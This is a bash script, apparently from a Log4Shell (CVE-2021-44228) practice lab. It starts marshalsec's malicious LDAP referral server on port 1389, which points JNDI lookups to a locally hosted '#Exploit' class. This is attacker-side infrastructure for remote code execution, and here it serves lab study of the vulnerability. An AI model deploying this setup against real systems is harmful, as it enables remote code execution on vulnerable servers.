#!/usr/bin/env bash
set -euo pipefail

LAB_DIR="/opt/log4shell"
LDAP_DIR="$LAB_DIR/CVE-2021-44228/ldap_server"
LOG_DIR="$LAB_DIR/logs"
mkdir -p "$LOG_DIR"

JAR="$(ls "$LDAP_DIR"/target/ldap_server-*-all.jar 2>/dev/null | head -n1)"

if [ -z "$JAR" ]; then
  echo "[-] ldap_server JAR not found in $LDAP_DIR/target." >&2
  echo "    Build it with: cd $LDAP_DIR && mvn clean package -DskipTests"
  exit 1
fi

if ss -tulpn 2>/dev/null | grep -q ':1389 '; then
  echo "[=] Something already listening on port 1389."
  exit 0
fi

HTTP_HOST="127.0.0.1"
HTTP_PORT="8000"

echo "[*] Starting LDAP server on :1389 (redirects to http://${HTTP_HOST}:${HTTP_PORT}/#Exploit) ..."
nohup java -cp "$JAR" marshalsec.jndi.LDAPRefServer "http://${HTTP_HOST}:${HTTP_PORT}/#Exploit" >"$LOG_DIR/ldap-server.log" 2>&1 &

echo "[*] Logs: $LOG_DIR/ldap-server.log"
